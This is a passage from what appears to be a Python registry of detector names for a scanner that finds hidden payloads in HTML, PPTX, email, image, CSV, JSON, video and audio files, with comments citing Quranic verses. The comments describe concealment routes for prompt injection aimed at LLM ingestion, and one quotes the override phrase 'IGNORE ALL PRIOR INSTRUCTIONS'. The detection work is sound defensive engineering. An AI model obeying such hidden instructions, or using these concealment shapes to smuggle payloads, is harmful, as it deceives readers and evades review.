    # until JavaScript instantiates them via importNode / shadow-DOM
    # cloning; flatteners and indexers read the body regardless.
    # Closes 02_template.
    "html_template_payload",
    # ``html_comment_payload`` - HTML comment (``<!-- ... -->``)
    # whose body exceeds the routine length floor (16 chars). Strip
    # conditional-comment IE legacy patterns. Comments are stripped
    # from the rendered tree but preserved verbatim in source view
    # and LLM ingestion paths. Closes 03_comment_payload.
    "html_comment_payload",
    # ``html_meta_payload`` - ``<meta name=...|property=... content=
    # ...>`` value that exceeds 256 chars (length trigger) or that
    # appears in a content-summary surface (description, keywords,
    # og:description, twitter:description, abstract, subject,
    # summary) and does not appear anywhere in the rendered body
    # (divergence trigger). Crawlers, social unfurlers, and LLM
    # ingestion paths read meta content verbatim. Closes
    # 04_meta_content.
    "html_meta_payload",
    # ``html_style_content_payload`` - CSS ``content:`` declaration
    # inside a ``<style>`` block whose string value either exceeds
    # 64 chars (length trigger) or sits in a rule body that also
    # carries a render-suppressing companion declaration (color:
    # white, color: transparent, opacity: 0, display: none, etc.).
    # Pseudo-element generated content reaches the DOM via
    # getComputedStyle().content and is read by indexers regardless
    # of color or visibility. Closes 05_css_content.
    "html_style_content_payload",
    # Phase 18 — PPTX batin surface (Al-Baqarah 2:79 — the presentation-
    # file attack surface exactly: structured, visual, trustworthy-looking
    # slides written with hidden payloads in their notes, masters,
    # embedded OLE objects, macros, revision history, external links,
    # action-hyperlink shapes, and custom XML parts).
    #
    # Tier 1 — most dangerous (verified active / embedded content):
    #   pptx_vba_macros          A ``ppt/vbaProject.bin`` entry is
    #                             present. VBA in a presentation is
    #                             active code the moment the reader
    #                             enables content; parallels
    #                             docx_vba_macros and xlsx_vba_macros
    #                             (all tier 1 / sev 0.40).
    #   pptx_embedded_object     One or more entries under
    #                             ``ppt/embeddings/`` — OLE objects,
    #                             other Office documents, or packaged
    #                             binaries. Mirrors docx_embedded_object
    #                             and xlsx_embedded_object.
    #
    # Tier 2 — most common (container-level concealment / structural
    # suppression of content whose text remains in the archive):
    #   pptx_hidden_slide        A ``<p:sldId ... show="0"/>`` in
    #                             ``ppt/presentation.xml`` OR a
    #                             ``<p:sld show="0">`` on a slide root.
    #                             PowerPoint skips the slide when
    #                             presenting, but the slide part and its
    #                             notes live unchanged in the ZIP and
    #                             are readable by every ingestion
    #                             pipeline. Parallels xlsx_hidden_sheet.
    #   pptx_slide_master_injection
    #                             Visible text runs present inside a
    #                             ``ppt/slideMasters/*`` or
    #                             ``ppt/slideLayouts/*`` part — masters
    #                             render *behind* every slide using
    #                             them, so a payload placed on the master
    #                             is overlaid onto what looks like clean
    #                             body slides. Structural: masters exist
    #                             for legitimate template purposes; text
    #                             runs inside them are the suspect shape.
    #   pptx_external_link       A relationship with
    #                             ``TargetMode="External"`` anywhere in
    #                             the ZIP (presentation rels, slide rels,
    #                             master rels, notes rels) or an
    #                             ``ppt/externalLinks/`` part. Mirrors
    #                             docx_external_relationship and
    #                             xlsx_external_link.
    #   pptx_action_hyperlink    An ``<a:hlinkClick>`` or
    #                             ``<a:hlinkMouseOver>`` element whose
    #                             ``action`` attribute carries a
    #                             ``ppaction://`` URI (``program``,
    #                             ``hlink``, ``jump``) or a
    #                             ``macro:`` target. Clicking (or
    #                             hovering over) the shape invokes the
    #                             action; the shape's rendered caption
    #                             is the zahir surface, the action
    #                             payload is the batin. Parallels the
    #                             DOCX/XLSX external-link vector with
    #                             an action-dispatch twist.
    #
    # Tier 2-3 — most subtle:
    #   pptx_speaker_notes_injection
    #                             A ``ppt/notesSlides/notesSlide*.xml``
    #                             part whose rendered text runs contain
    #                             a concealment payload — either a
    #                             zahir-class Unicode anomaly (zero-
    #                             width / TAG / bidi / homoglyph /
    #                             math-alphanum) or a long opaque run
    #                             whose shape is suspicious. Speaker
    #                             notes are not visible to the audience
    #                             when the deck is presented, yet every
    #                             AI ingestion pipeline that extracts
    #                             "all text" from a PPTX reads them.
    #                             This is the highest-priority
    #                             performed-alignment shape in PPTX:
    #                             visible slides appear clean while the
    #                             notes carry prompt injections or
    #                             adversarial instructions. Exact 2:14
    #                             pattern — different content for
    #                             different audiences.
    #   pptx_revision_history    Entries under ``ppt/commentAuthors.xml``
    #                             / ``ppt/comments/*`` / ``ppt/revisionInfo.xml``
    #                             or a ``<p:modifyVerifier/>`` block
    #                             indicating tracked-changes /
    #                             collaborative-revision state is
    #                             preserved. The final view is
    #                             authoritative, but the prior content
    #                             is accessible to any reader that walks
    #                             the revision parts. Parallels
    #                             docx_revision_history and
    #                             xlsx_revision_history (all tier 3).
    #   pptx_custom_xml_payload  A ``customXml/*`` part carrying non-
    #                             trivial content (beyond the default
    #                             empty ``<ds:datastoreItem/>`` shell).
    #                             Custom XML is a legitimate feature
    #                             for document-data binding, but it is
    #                             also a carrier shape for arbitrary
    #                             payloads smuggled into an Office
    #                             archive under a part type most
    #                             readers never inspect. Tier 3
    #                             interpretive.
    "pptx_vba_macros",
    "pptx_embedded_object",
    "pptx_hidden_slide",
    "pptx_speaker_notes_injection",
    "pptx_revision_history",
    "pptx_slide_master_injection",
    "pptx_external_link",
    "pptx_action_hyperlink",
    "pptx_custom_xml_payload",
    # Phase 19 — EML (RFC 5322 email) batin surface. Email's structural
    # attack surface is dominated by attachments and headers — both live
    # outside what the reader sees when the message is rendered, and
    # both are the canonical concealment vectors in practice. Seven
    # mechanisms cover the priority bands:
    #
    # Tier 1 — most dangerous (verified active / executable content):
    #   eml_executable_attachment
    #                             An attachment whose filename extension
    #                             or declared MIME type marks it as an
    #                             executable (``.exe``, ``.bat``, ``.cmd``,
    #                             ``.com``, ``.scr``, ``.pif``, ``.js``,
    #                             ``.vbs``, ``.wsf``, ``.jar``, ``.msi``,
    #                             ``.ps1``, ``application/x-msdownload``,
    #                             etc.). Parallels ``docx_vba_macros`` /
    #                             ``pptx_vba_macros`` in weight; active
    #                             code the moment the recipient opens
    #                             the attachment.
    #
    #   eml_macro_attachment      An attachment whose extension marks it
    #                             as a macro-enabled Office document
    #                             (``.docm``, ``.xlsm``, ``.pptm``,
    #                             ``.dotm``, ``.xltm``, ``.potm``). The
    #                             macro itself will be reported
    #                             recursively by the per-format analyzer
    #                             when the attachment is scanned; this
    #                             finding surfaces the envelope-level
    #                             shape (an inbound macro-enabled Office
    #                             doc) which is itself a high-signal
    #                             phishing marker.
    #
    # Tier 2 — most common (structural concealment of prior/external state):
    #   eml_attachment_present    One or more attachments are present.
    #                             Tier-3 interpretive on its own —
    #                             attachments are legitimate — but
    #                             surfaced so every batin finding rolls
    #                             up with a count of what recipient-side
    #                             actions the message invites. Parallels
    #                             PDF ``embedded_file``.
    #
    #   eml_external_reference    The HTML body references an external
    #                             URL (``<img src="http..."``,
    #                             ``<link href="http..."``, remote CSS,
    #                             tracking pixels). Parallels
    #                             ``html_external_reference`` and
    #                             ``docx_external_relationship``.
    #                             Phishing-beacon / tracking-pixel /
    #                             remote-load shape at the email surface.
    #
    #   eml_smuggled_header       A header that violates RFC 5322 shape
    #                             in a way that suggests smuggling:
    #                             duplicate single-instance headers
    #                             (``Subject``, ``From``, ``To``, ``Date``
    #                             — RFC 5322 §3.6 declares these
    #                             single-occurrence), header-injection
    #                             sequences (embedded ``\\r\\n`` in a
    #                             header value), or a header whose value
    #                             runs past the typical fold-length with
    #                             no fold. Downstream mail handlers
    #                             disagree on which duplicate wins —
    #                             exact 2:14 shape at the routing layer.
    #
    # Tier 2-3 — most subtle (nested / container anomalies):
    #   eml_nested_eml            An attachment whose MIME type is
    #                             ``message/rfc822`` (or whose filename
    #                             ends ``.eml``) — the message carries
    #                             another email inside. Structural
    #                             nesting is legitimate for forwards but
    #                             also a carrier shape for payload
    #                             smuggling and recursive concealment.
    #                             EmlAnalyzer recurses into nested
    #                             messages so the inner findings roll
    #                             up into the outer report.
    #
    #   eml_mime_boundary_anomaly
    #                             A multipart boundary that is
    #                             suspiciously short, missing from the
    #                             declared parts, or that appears inside
    #                             a part's body where it should not.
    #                             Boundary manipulation lets a message
    #                             smuggle parts past non-strict MIME
    #                             parsers (an attachment that a lenient
    #                             reader treats as inline body and a
    #                             strict filter skips entirely, or
    #                             vice-versa). Tier-3 interpretive.
    "eml_executable_attachment",
    "eml_macro_attachment",
    "eml_attachment_present",
    "eml_external_reference",
    "eml_smuggled_header",
    "eml_nested_eml",
    "eml_mime_boundary_anomaly",
    # v1.1.2 EML format-gauntlet batin mechanisms. Each surfaces a
    # routing- or header-layer shape that is concealed from the reader
    # by default — the mail client never renders ``Return-Path``,
    # ``Received`` chains, folded continuation lines, or X-* annotation
    # values to the user, but parsers, downstream filters, and
    # automation pipelines all read them.
    #
    #   eml_returnpath_from_mismatch
    #                             ``Return-Path`` (SMTP envelope MAIL
    #                             FROM) and ``From`` (rendered sender)
    #                             resolve to different registered
    #                             domains. Mail servers and reputation
    #                             systems see one identity; the reader
    #                             sees another.
    #
    #   eml_received_chain_anomaly
    #                             The ``Received`` chain shows zero hops
    #                             through the From-claimed registered
    #                             domain. A legitimate message from
    #                             ``billing@vendor.example`` should
    #                             traverse that domain's outbound MTA in
    #                             at least one Received hop; routing
    #                             entirely through unrelated relays is
    #                             a structural anomaly at the
    #                             prior-state routing layer.
    #
    #   eml_header_continuation_payload
    #                             A header (other than DKIM-Signature /
    #                             ARC-* / Authentication-Results /
    #                             Received, where heavy folding is
    #                             routine) carries six or more RFC 5322
    #                             folded continuation lines. The mail
    #                             client renders only the first-line
    #                             summary; byte-level scanners read raw
    #                             lines and never reassemble the
    #                             unfolded value. Distinct from
    #                             ``eml_smuggled_header`` (duplicate
    #                             single-instance / CRLF injection).
    #
    #   eml_xheader_payload       An ``X-*`` header (other than vendor
    #                             signatures and known-large bulk-
    #                             infrastructure annotations) whose
    #                             unfolded value exceeds the long-header
    #                             length threshold. Mail clients hide
    #                             the extended header panel by default;
    #                             custom X-* annotations do not reach
    #                             the reader.
    "eml_returnpath_from_mismatch",
    "eml_received_chain_anomaly",
    "eml_header_continuation_payload",
    "eml_xheader_payload",
    # v1.1.2 image gauntlet (F1) closure additions:
    #
    #   image_jpeg_appn_payload    A JPEG application marker in the
    #                              APP4-15 range (0xFFE4 through
    #                              0xFFEF) carries readable UTF-8
    #                              text at high printable density.
    #                              APP0 (JFIF), APP1 (EXIF/XMP),
    #                              APP2 (ICC), and APP3 (Meta/JPS)
    #                              are excluded. Office and financial
    #                              document workflows have no
    #                              legitimate reason to populate
    #                              APP4-15 with natural-language
    #                              text. Distinct from
    #                              ``suspicious_image_chunk``
    #                              (existing Tier 3 finding on any
    #                              non-standard marker); this
    #                              mechanism elevates to Tier 1 and
    #                              recovers the payload.
    "image_jpeg_appn_payload",
    #
    #   image_png_private_chunk    A PNG private ancillary chunk
    #                              (lowercase first byte and lowercase
    #                              second byte per RFC 2083) carries
    #                              readable UTF-8 text at high
    #                              printable density. Private chunks
    #                              are documented vendor-metadata
    #                              infrastructure, so the baseline is
    #                              Tier 2 structural notability. Per-
    #                              trigger Tier 1 escalation findings
    #                              are emitted alongside the Tier 2
    #                              baseline when the chunk text
    #                              additionally exhibits any of three
    #                              concealment triggers (bidi, zero
    #                              width, or length above the long-
    #                              payload metadata threshold),
    #                              parallel to pdf_metadata_analyzer.
    "image_png_private_chunk",
    #
    #   image_png_text_chunk_payload  A PNG public text chunk (tEXt,
    #                              iTXt, or zTXt) value field exhibits
    #                              one or more of four byte-
    #                              deterministic concealment triggers
    #                              parallel to pdf_metadata_analyzer:
    #                              length above 1024 bytes, bidi
    #                              override codepoints, zero-width
    #                              codepoints, or explicit concealment
    #                              markers (HIDDEN_, BATIN_, ZAHIR_,
    #                              PAYLOAD). Each trigger emits its
    #                              own Tier 1 finding. Closes the
    #                              parallel-structure gap with the PDF
    #                              metadata analyzer for the public
    #                              PNG text chunk namespace.
    "image_png_text_chunk_payload",
    #
    #   svg_title_payload          An SVG <title> element whose text
    #                              content exceeds 64 bytes. <title>
    #                              is the accessibility tooltip
    #                              surface, scanned by indexers and
    #                              LLMs but not rendered as glyph
    #                              content; long values are
    #                              structurally anomalous against
    #                              clean-corpus distributions.
    "svg_title_payload",
    #
    #   svg_desc_payload           An SVG <desc> element whose text
    #                              content exceeds 256 bytes. <desc>
    #                              is the SVG long-form accessibility
    #                              description surface, scanned by
    #                              indexers and LLMs but not rendered
    #                              as glyph content. Threshold split
    #                              from svg_title_payload (64-byte)
    #                              because <desc> has a different
    #                              clean-corpus distribution: multi-
    #                              sentence chart legends and
    #                              scientific diagram captions are
    #                              legitimate.
    "svg_desc_payload",
    #
    #   svg_metadata_payload       An SVG <metadata> element whose
    #                              aggregate text content exceeds
    #                              128 bytes. <metadata> is the
    #                              machine-readable annotation
    #                              surface (RDF, Dublin Core,
    #                              Creative Commons license blocks)
    #                              scanned by indexers and LLMs but
    #                              not rendered as glyph content.
    #                              Threshold sits between <title>
    #                              (64) and <desc> (256) because
    #                              well-formed metadata blocks
    #                              holding only license URI and
    #                              creator name fall well below 128
    #                              bytes, while payload-bearing
    #                              metadata (multi-sentence
    #                              dc:description) crosses it.
    "svg_metadata_payload",
    #
    #   svg_defs_unreferenced_text An SVG <text> element nested
    #                              inside <defs> whose id is never
    #                              referenced by any <use> element
    #                              (or which lacks an id entirely
    #                              and therefore cannot be
    #                              instantiated by <use>). <defs>
    #                              is the SVG template surface; its
    #                              children render only when
    #                              instantiated via <use href="#id">.
    #                              Unreferenced <text> in <defs> is
    #                              fully readable by indexers and
    #                              LLMs but never appears as glyph
    #                              content for the human reader.
    "svg_defs_unreferenced_text",
    # Phase 20 — CSV / TSV / delimited-data batin surface. CSV has no
    # native hidden-row mechanism like XLSX; "hidden" in CSV means
    # rows or bytes that a parser silently drops or reinterprets while
    # the human reader sees only the rendered grid. Eight mechanisms
    # cover the priority bands:
    #
    # Tier 1 — most dangerous (verified destructive shape):
    #   csv_null_byte             A NUL (``\\x00``) byte inside the file.
    #                             Every C-string-based CSV parser
    #                             truncates at the first NUL, silently
    #                             dropping everything downstream of it;
    #                             Python's ``csv`` module raises on NUL
    #                             but ``pandas.read_csv`` has tolerated
    #                             them at various versions. Exact shape
    #                             parsers disagree on → different
    #                             readers see different content. Also a
    #                             classic file-format confusion vector.
    #
    # Tier 2 — most common (structural concealment parsers silently
    # skip or misalign on):
    #   csv_comment_row           A row whose first non-whitespace
    #                             character is ``#``. Python's ``csv``
    #                             module treats it as a data row;
    #                             ``pandas.read_csv`` can be configured
    #                             to skip it; shell ``awk`` / ``cut``
    #                             treat it case-by-case. Duplicate-
    #                             reading shape: the same file is two
    #                             different datasets depending on the
    #                             reader. Comment rows are also the
    #                             canonical prompt-injection carrier in
    #                             delimited data (``# IGNORE ALL PRIOR
    #                             INSTRUCTIONS``).
    #
    #   csv_inconsistent_columns  A row whose column count differs from
    #                             the header's. Strict parsers raise;
    #                             lenient parsers pad with None / shift
    #                             columns; the rendered table in
    #                             different tools shows different
    #                             alignments. Structural misreading
    #                             vector.
    #
    #   csv_bom_anomaly           A UTF-8 BOM (``\\xef\\xbb\\xbf``)
    #                             appears at a position other than the
    #                             first byte, OR the file contains
    #                             multiple BOMs. Some CSV libraries
    #                             treat a mid-file BOM as a literal
    #                             zero-width character in a cell; others
    #                             raise. The first-column header often
    #                             gets silently mis-parsed as
    #                             ``\\ufeffColumn`` when a BOM is not
    #                             stripped.
    #
    #   csv_mixed_encoding        The file cannot be decoded cleanly as
    #                             a single announced encoding — bytes
    #                             consistent with UTF-8 multibyte
    #                             sequences coexist with high-bit Latin-1
    #                             bytes that are not valid UTF-8
    #                             continuations. The reader sees what
    #                             their locale / editor guesses; the
    #                             filter sees what its chosen codec
    #                             renders. Different tools read different
    #                             strings.
    #
    #   csv_mixed_delimiter       Two distinct candidate delimiters
    #                             (``,`` and ``\\t``, ``,`` and ``|``,
    #                             etc.) both appear at high frequency
    #                             across the file. Auto-detect sniffers
    #                             (Excel's, Python's ``csv.Sniffer``,
    #                             pandas' ``sep=None``) will disagree
    #                             on which is the real delimiter; the
    #                             two choices produce different column
    #                             alignments. Structural ambiguity
    #                             that different readers resolve
    #                             differently.
    #
    #   csv_quoting_anomaly       An unbalanced quote or an unescaped
    #                             quote inside an unquoted field. Strict
    #                             parsers raise; lenient parsers produce
    #                             a single giant cell that consumes the
    #                             rest of the file. Shape classic enough
    #                             that Excel and pandas already disagree
    #                             on it.
    #
    # Tier 3 — most subtle (DoS-shaped / interpretive):
    #   csv_oversized_field       A single cell whose byte length
    #                             exceeds the DoS threshold (default
    #                             1 MB). Legitimate data export rarely
    #                             produces a megabyte-long field;
    #                             adversarially-crafted values exist to
    #                             exhaust memory in downstream readers
    #                             (the "zip-bomb of CSV"). Interpretive
    #                             — a very long genuine log-line field
    #                             would also fire.
    "csv_null_byte",
    "csv_comment_row",
    "csv_inconsistent_columns",
    "csv_bom_anomaly",
    "csv_mixed_encoding",
    "csv_mixed_delimiter",
    "csv_quoting_anomaly",
    "csv_oversized_field",
    # v1.1.2 F2 mechanism 1: per-column type-drift detector. The
    # header declares the column's type signature; a row that
    # violates it with a long free-text payload is the canonical
    # column-hijack shape. Tier 2 batin, severity 0.15. See
    # analyzers/csv_column_type_drift.py.
    "csv_column_type_drift",
    # v1.1.2 F2 mechanism 3: RFC 4180 quoted multi-line payload.
    # A quoted cell with two or more embedded newlines AND length
    # above 128 chars is multi-paragraph payload smuggled into a
    # single tabular cell. Tier 1 batin, severity 0.20. See
    # analyzers/csv_quoted_newline_payload.py.
    "csv_quoted_newline_payload",
    # v1.1.2 F2 mechanism 6: encoding-divergence detector. The
    # same bytes decode to different cell text under UTF-8 vs
    # latin-1 in any (row, column) position. The fork is invisible
    # from any single decoded surface; only a two-decode walk
    # surfaces it. Tier 1 batin, severity 0.20. See
    # analyzers/csv_encoding_divergence.py.
    "csv_encoding_divergence",
    # v1.1.2 F2 mechanism 8 (JSON Step 9): unicode-escape-payload
    # detector. JSON permits \uXXXX escapes that strict parsers
    # silently decode. An escape whose codepoint falls in the bidi
    # override range (U+202A-U+202E, U+2066-U+2069) or zero-width
    # range (U+200B, U+200C, U+200D, U+FEFF) bypasses the v1.1.1
    # post-parse string walk because the raw bytes are ASCII; only
    # a pre-parse byte-stream scan surfaces it. Tier 1 batin,
    # severity 0.20. See analyzers/json_unicode_escape_payload.py.
    "json_unicode_escape_payload",
    # v1.1.2 F2 mechanism 10 (JSON Step 10): comment-anomaly detector.
    # RFC 8259 (strict JSON) does not permit comments. Lenient parsers
    # (JSON5, jsonc, hjson, VS Code settings parser) silently accept
    # both ``//`` line comments and ``/* ... */`` block comments. The
    # comment text is invisible to any post-parse tree walk because
    # the parser strips it; the byte stream carries the payload.
    # Tier 2 batin (structural shape with legitimate-toolchain false-
    # positive surface), severity 0.15. See
    # analyzers/json_comment_anomaly.py.
    "json_comment_anomaly",
    # v1.1.2 F2 mechanism 11 (JSON Step 11): prototype-pollution-key
    # detector. A JSON object key matching ``__proto__``,
    # ``constructor``, or ``prototype`` is the canonical JS
    # prototype-pollution shape; recursive-merge consumers (Lodash
    # _.merge, jQuery $.extend, minimist, etc.) treat the key as a
    # prototype-chain mutation primitive rather than data. Tier 1
    # batin (high precision, severe downstream consequence),
    # severity 0.20. See analyzers/json_prototype_pollution_key.py.
    "json_prototype_pollution_key",
    # v1.1.2 F2 mechanism 12 (JSON Step 12): deep-nesting payload
    # detector. A leaf string at nesting depth >= 32 AND length > 256
    # chars is the canonical deep-nesting smuggle shape: shallow
    # walkers (recursive merge, sanitizers, schema validators that
    # bail at depth N) skip the payload entirely. Higher precision
    # than the v1.1 excessive_nesting structural detector because the
    # conjunction excludes deep-but-empty data-shaped trees. Tier 2
    # batin, severity 0.15. See analyzers/json_nested_payload.py.
    "json_nested_payload",
    # v1.1.2 F2 mechanism 13 (JSON Step 13): trailing-payload
    # detector. Non-whitespace content past the root value's
    # closing token is a strict-JSON violation that lenient
    # consumers (raw_decode, jq, streaming JSON, naive
    # ``JSON.parse`` after a slice) silently discard. The trailing
    # bytes are invisible to any tool that walks the parsed value
    # alone. Tier 1 batin (high precision, parser-invisible),
    # severity 0.20. See analyzers/json_trailing_payload.py.
    "json_trailing_payload",
    # Phase 21 — production-hardening meta-mechanisms. Both live in the
    # batin layer because they describe the *scanner's* inner state
    # (what was not inspected, what could not be identified) rather
    # than anything visible to the reader of the document surface.
    #
    #   unknown_format   The file could not be identified by magic bytes
    #                    or by extension. Emitted by FallbackAnalyzer
    #                    together with the metadata a forensics reader
    #                    needs (first-512-bytes hex preview, declared
    #                    extension, size, magic-byte prefix). Prevents
    #                    the silent "zero findings, score 1.0" failure
    #                    mode: a file we cannot classify cannot be
    #                    vouched for. Al-Baqarah 2:42 again — absence
    #                    of findings in an unidentified file is not
    #                    evidence of cleanness.
    #
    #   scan_limited     A configured safety ceiling (file size, row
    #                    count, recursion depth, attachment count,
    #                    field length) was hit during scanning. The
    #                    analyzer halted, emitted this finding, and
    #                    marked the scan incomplete — graceful
    #                    degradation in the sense of "never crash",
    #                    but structurally honest: the portion beyond
    #                    the limit was not inspected. La yukallifu
    #                    Allahu nafsan illa wus'aha (Al-Baqarah 2:286):
    #                    the scanner does not burden itself beyond its
    #                    configured capacity, and reports its limits
    #                    instead of lying about coverage.
    "unknown_format",
    "scan_limited",
    # scan_error is a meta-mechanism — the scan itself did not complete.
    # It is structural (not visible to the reader) and so is catalogued
    # under batin, consistent with "the inner state was not fully
    # inspected".
    "scan_error",
    # -----------------------------------------------------------------
    # Phase 24 — video-container batin mechanisms.
    # -----------------------------------------------------------------
    # The viewer sees playback; the container carries concealment
    # structurally across its stems. Al-Baqarah 2:19-20 — the lightning
    # (playback) dominates attention while the storm's darker layers
    # (boxes, tracks, attachments, cover art, trailing bytes) carry the
    # payload:
    #
    #   video_stream_inventory       Informational meta-finding — the
    #                                list of tracks (video/audio/
    #                                subtitle/metadata/attachment) and
    #                                their codecs the analyzer enumerated
    #                                during its decompose pass. Not a
    #                                deduction; the analyst sees at a
    #                                glance which stems were actually
    #                                inspected. Severity zero.
    #
    #   video_metadata_suspicious    Container metadata (MP4 ``udta/meta/
    #                                ilst`` iTunes atoms, MOV ``udta``
    #                                text, MKV ``Tags``) contains the
    #                                same Unicode concealment vocabulary
    #                                the text analyzers already detect —
    #                                zero-width, bidi, TAG, homoglyph —
    #                                or carries base64-shaped payloads
    #                                in title/artist/comment fields that
    #                                no legitimate production pipeline
    #                                would emit.
    #
    #   video_embedded_attachment    MKV's ``Attachments`` element OR an
    #                                MP4 ``free`` / ``skip`` / ``uuid``
    #                                box carries an arbitrary embedded
    #                                file (PDF, script, executable,
    #                                font). Every attachment is a
    #                                payload-carrier; the container lets
    #                                it ride alongside the video without
    #                                surfacing in playback. The finding
    #                                names the attachment (filename,
    #                                MIME, size) so a forensics reader
    #                                can decide.
    #
    #   video_frame_stego_candidate  Cover art or thumbnail images
    #                                embedded in metadata (MP4 ``udta/
    #                                meta/covr``, MKV attachment of
    #                                MIME image/*) exhibit LSB-
    #                                steganography statistics or carry
    #                                trailing data after the image
    #                                terminator. ImageAnalyzer's own
    #                                detectors fire on the cover-art
    #                                bytes and VideoAnalyzer re-emits
    #                                the evidence under this name so
    #                                the signal is attributed to the
    #                                video surface.
    #
    #   video_container_anomaly      The byte stream contains trailing
    #                                data after the last valid top-
    #                                level box, OR a top-level box's
    #                                declared size disagrees with its
    #                                actual span, OR a foreign magic
    #                                header (e.g. ``%PDF-``) is found
    #                                inside ``mdat``. Polyglot-shape
    #                                evidence at the container level.
    #
    #   video_cross_stem_divergence  Stems disagree: the container-
    #                                level title (``udta/©nam``) differs
    #                                from a per-track title, or a
    #                                subtitle track declares a language
    #                                different from the container's
    #                                ``und``/``eng`` hint, or the
    #                                duration in ``mvhd`` differs from
    #                                the sample table's implied span.
    #                                Interpretive — localised
    #                                productions legitimately carry
    #                                divergent titles per track; the
    #                                finding flags the shape for the
    #                                reader, who performs the
    #                                recognition.
    "video_stream_inventory",
    "video_metadata_suspicious",
    "video_embedded_attachment",
    "video_frame_stego_candidate",
    "video_container_anomaly",
    "video_cross_stem_divergence",
    # -----------------------------------------------------------------
    # Phase 24 — audio (MP3 / WAV / FLAC / M4A / OGG) — Al-Baqarah 2:93
    # -----------------------------------------------------------------
    # "Take what We have given you with determination and listen."
    # They said: "We hear and disobey." The verse names the audio
    # attack shape exactly — compliance declared at the surface
    # (we hear) while disobedience rides in the depth (and disobey).
    # Identity theft through voice cloning is tazwir and iftira'
    # (Al-Nisa 4:112): fabricated speech attributed to a speaker who
    # never uttered it. The container's batin stems — metadata atoms
    # the listener never inspects, embedded pictures the player
    # renders as thumbnail-only, PCM sample LSBs no ear can resolve,
    # trailing bytes after the last frame — carry the payloads that
    # deceive artificial systems, mankind, and jinnkind:
    #
    #   audio_stem_inventory            Informational meta-finding —
    #                                   the list of stems (metadata
    #                                   tags, embedded pictures, sample
    #                                   data surface, container frame
    #                                   count) the analyzer enumerated
    #                                   during its decompose pass.
    #                                   Severity zero.
    #
    #   audio_metadata_identity_anomaly Speaker / encoder / creation
    #                                   provenance fields disagree,
    #                                   are missing where the format
    #                                   expects them, or carry values
    #                                   known to be forged in voice-
    #                                   cloning pipelines. The highest-
    #                                   priority audio mechanism — it
    #                                   is the specific shape 4:112
    #                                   describes.
    #
    #   audio_embedded_payload          A container's picture /
    #                                   attachment stem carries bytes
    #                                   that ImageAnalyzer's detectors
    #                                   flag (LSB steganography,
    #                                   trailing data, high-entropy
    #                                   metadata, text concealment in
    #                                   EXIF), OR the embedded payload
    #                                   is a format other than image
    #                                   (PE, ZIP, script). Every such
    #                                   embedding rides as an audio
    #                                   stem the listener never sees.
    #
    #   audio_lsb_stego_candidate       WAV or FLAC PCM sample data
    #                                   exhibits statistical LSB bias
    #                                   that stego channels produce —
    #                                   uniform LSB distribution across
    #                                   a long run of samples, or
    #                                   suspiciously structured LSB
    #                                   byte-shapes. Tier 2 structural:
    #                                   genuine recordings also produce
    #                                   uniform LSBs in silence, so
    #                                   the finding is a candidate,
    #                                   not a verdict.
    #
    #   audio_high_entropy_metadata     A single metadata atom whose
    #                                   value has near-random entropy
    #                                   across more bytes than any
    #                                   organic title / artist / lyric
    #                                   field would carry. Payload-
    #                                   riding-as-metadata shape.
    #
    #   audio_container_anomaly         Trailing bytes after the last
    #                                   valid frame / chunk / page,
    #                                   declared-size disagrees with
    #                                   actual span, or a foreign
    #                                   magic header sits inside the
    #                                   sample-data region. Polyglot-
    #                                   shape evidence at the
    #                                   container level.
    #
    #   audio_cross_stem_divergence     Stems disagree — e.g. the
    #                                   ID3v1 title differs from the
    #                                   ID3v2 title, or the declared
    #                                   frame count contradicts the
    #                                   number of synchronised frames,
    #                                   or the container reports a
    #                                   codec that the first frame
    #                                   header contradicts.
    #                                   Interpretive — localised
    #                                   re-mastering can legitimately
    #                                   produce divergent titles;
    #                                   the finding flags the shape
    #                                   for the reader.
    #
    # FUTURE WORK (mechanisms named but not yet registered — implement
    # when the listed dependency is available):
    #
    #   audio_signal_stem_separation    status=future, dependency_note=
    #                                   "requires neural model under
    #                                   50MB opening detection surface
    #                                   container-level extraction
    #                                   cannot reach". Source-separates
    #                                   the mix into vocals / music /
    #                                   other so voice-cloned vocals
    #                                   can be inspected in isolation.
    #
    #   audio_deepfake_detection        status=future, dependency_note=
    #                                   "requires trained deepfake
    #                                   classifier model". Downstream
    #                                   of audio_signal_stem_separation.
    #
    #   audio_hidden_voice_command      status=future, dependency_note=
    #                                   "requires psychoacoustic /
    #                                   adversarial-perturbation
    #                                   detector; ultrasonic command
    #                                   embeddings invisible to the
    #                                   container walk". Signal-level
    #                                   inspection, not stem-level.
    #
    # Each future mechanism gets its name reserved HERE in this comment
    # so a later phase can register it without risking a name collision
    # with some other concealment mechanism. The mechanism name is
    # itself a commitment — the registry is an isnad.
    "audio_stem_inventory",
    "audio_metadata_identity_anomaly",
    "audio_embedded_payload",
    "audio_lsb_stego_candidate",
    "audio_high_entropy_metadata",
    "audio_container_anomaly",
    "audio_cross_stem_divergence",
    # -----------------------------------------------------------------
    # Phase 25+ — cross-modal correlation — Al-Baqarah 2:164
    # -----------------------------------------------------------------
    # "Indeed, in the creation of the heavens and the earth, and the
    # alternation of the night and the day... are signs for a people
    # who use reason." The verse names the design requirement: no
    # single stem reveals the full picture; the signs appear when
    # the separated elements are read together by someone who uses
    # reason. CrossModalCorrelationEngine reads the stems the Phase
    # 23/24 analyzers already separated and applies reasoning logic
    # across them. Al-Baqarah 2:282 — the engine is a witness across
    # stems, not a judge of content. Two mechanisms are active in the
    # first session; five additional rules are reserved for later
    # sessions (documented at the bottom of this block):
    #
    #   cross_stem_inventory               The parting operation (Al-
    #                                      Baqarah 2:50) made visible.
    #                                      Meta-finding enumerating
    #                                      every stem the upstream
    #                                      analyzers extracted and
    #                                      every finding produced per
    #                                      stem. Severity zero. Flags
    #                                      cases where expected stems
    #                                      are absent (the container
    #                                      declared a subtitle track
    #                                      the inventory never saw).
    #
    #   cross_stem_undeclared_text         Subtitle / lyric / caption
    #                                      stem carries substantial
    #                                      text BUT the container's
    #                                      metadata does not declare
    #                                      that the file contains
    #                                      textual content. An AI
    #                                      ingestion pipeline reading
    #                                      only metadata would not
    #                                      expect text to be present,
    #                                      yet the subtitle extractor
    #                                      will still surface the
    #                                      payload. The shape 2:42
    #                                      describes at the cross-stem
    #                                      level: the metadata's
    #                                      outward declaration and the
    #                                      subtitle's inner content
    #                                      disagree.
    #
    # FUTURE WORK (Step 6 of the session prompt — reserved names,
    # detector logic to land in subsequent sessions):
    #
    #   cross_stem_text_inconsistency      Multi-stem text divergence
    #                                      — e.g. subtitle text
    #                                      contradicts metadata
    #                                      description across more
    #                                      than two stems. Requires
    #                                      a text-similarity primitive
    #                                      that does not depend on
    #                                      a trained model.
